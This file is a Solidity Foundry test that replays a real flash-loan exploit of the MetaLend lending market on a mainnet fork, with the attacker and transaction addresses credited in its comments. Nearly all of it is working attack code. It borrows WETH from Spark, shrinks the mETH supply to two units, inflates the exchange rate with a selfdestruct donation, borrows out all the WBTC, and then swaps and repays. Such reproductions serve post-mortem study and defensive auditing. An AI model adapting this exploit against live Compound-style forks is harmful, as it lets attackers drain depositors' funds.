// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./../basetest.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$4K
// Attacker : https://etherscan.io/address/0x0c06340f5024c114fe196fcb38e42d20ab00f6eb
// Attack Contract : https://etherscan.io/address/0x80a6419cb8e7d1ef1af074368f7eace1ae2358ca
// Vulnerable Contract : https://etherscan.io/address/0x5578f2e245e932a599c46215a0ca88707230f17b
// Attack Tx : https://app.blocksec.com/explorer/tx/eth/0x4c684fb2618c29743531dec9253ede1b757bda0b323dc2f305e3b50ab1773da7

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x5578f2e245e932a599c46215a0ca88707230f17b#code

// @Analysis
// Post-mortem :
// Twitter Guy : https://x.com/MetaSec_xyz/status/1728424965257691173
// Hacking God :

contract MetaLendExploit is BaseTestWithBalanceLog {
    IAaveFlashloan private constant Spark = IAaveFlashloan(0xC13e21B648A5Ee794902342038FF3aDAB66BE987);
    Uni_Router_V2 private constant Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IWETH private constant WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC20 private constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    ICointroller private constant Comptroller = ICointroller(0x0ee4b2C533ED3fFbd9f04CD7E812A4041bbE89f6);

    uint256 private constant blocknumToForkFrom = 18_648_753;

    function setUp() public {
        vm.createSelectFork("mainnet", blocknumToForkFrom);
        vm.label(address(Spark), "Spark");
        vm.label(address(Router), "Router");
        vm.label(address(WETH), "WETH");
        vm.label(address(WBTC), "WBTC");
        vm.label(address(Comptroller), "Comptroller");
    }

    function testExploit() public {
        deal(address(this), 0);
        emit log_named_decimal_uint("Exploiter WETH balance before attack", WETH.balanceOf(address(this)), 18);

        Spark.flashLoanSimple(address(this), address(WETH), 100e18, bytes(""), 0);

        emit log_named_decimal_uint("Exploiter WETH balance after attack", WETH.balanceOf(address(this)), 18);
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        WETH.withdraw(WETH.balanceOf(address(this)));
        Helper helper = new Helper{value: 100 ether}();
        helper.donateAndBorrow();
        WETH.deposit{value: address(this).balance}();
        WBTC.approve(address(Router), type(uint256).max);
        WBTCToWETH();
        WETH.approve(address(Spark), amount);
        return true;
    }

    receive() external payable {}

    function WBTCToWETH() private {
        address[] memory path = new address[](2);
        path[0] = address(WBTC);
        path[1] = address(WETH);
        Router.swapExactTokensForTokens(WBTC.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1_000);
    }
}

contract Helper is Test {
    IERC20 private constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    ICErc20Delegate private constant mWBTC = ICErc20Delegate(payable(0x0D8Df79195EC37C6cD53036f9F8eE0c24b23601E));
    crETH private constant mETH = crETH(payable(0x5578f2E245e932a599c46215a0cA88707230F17B));
    ICointroller private constant Comptroller = ICointroller(0x0ee4b2C533ED3fFbd9f04CD7E812A4041bbE89f6);
    address private immutable owner;

    constructor() payable {
        owner = msg.sender;
    }

    function donateAndBorrow() external {
        mETH.mint{value: 1 ether}();
        uint256 reedemAmount = mETH.totalSupply() - 2;
        mETH.redeem(reedemAmount);
        Donator donator = new Donator();
        donator.sendETHTo{value: address(this).balance}(address(mETH));
        address[] memory mTokens = new address[](1);
        mTokens[0] = address(mETH);
        Comptroller.enterMarkets(mTokens);
        uint256 underlyingWBTCAmount = mWBTC.getCash();
        mWBTC.borrow(underlyingWBTCAmount - 1);
        WBTC.transfer(owner, WBTC.balanceOf(address(this)));
        mETH.redeemUnderlying(mETH.getCash() - 1);
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success);
    }

    receive() external payable {}
}

contract Donator is Test {
    function sendETHTo(address to) external payable {
        selfdestruct(payable(to));
    }
}
